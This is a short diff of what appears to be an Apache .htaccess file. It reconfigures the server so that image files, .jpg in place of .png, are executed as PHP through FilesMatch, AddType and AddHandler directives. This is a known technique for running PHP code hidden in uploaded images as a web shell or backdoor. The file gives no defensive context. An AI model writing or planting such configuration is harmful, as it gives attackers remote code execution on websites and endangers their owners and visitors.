@@ -1,6 +1,6 @@
-<FilesMatch "\.(htm|html|php|png)$">
+<FilesMatch "\.(htm|html|php|jpg)$">
 SetHandler application/x-httpd-php
 </FilesMatch>
-AddType application/x-httpd-php .png
-AddHandler php-script .png
-AddHandler php-script .png
+AddType application/x-httpd-php .jpg
+AddHandler php-script .jpg
+AddHandler php-script .jpg
